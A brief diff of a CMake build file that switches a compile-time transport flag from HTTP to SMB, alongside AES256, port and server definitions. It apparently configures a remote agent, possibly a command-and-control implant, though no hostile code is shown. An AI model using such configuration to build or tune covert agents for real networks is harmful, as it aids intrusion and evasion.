@@ -60,7 +60,7 @@ set( CRYPT_SOURCE
 
 # preprocessor flags
 add_compile_definitions( DEBUG )
-add_compile_definitions( TRANSPORT_HTTP )
+add_compile_definitions( TRANSPORT_SMB )
 add_compile_definitions( AES256 )
 add_compile_definitions( PORT=4545 )          # 4545
 add_compile_definitions( SERVER=69 )
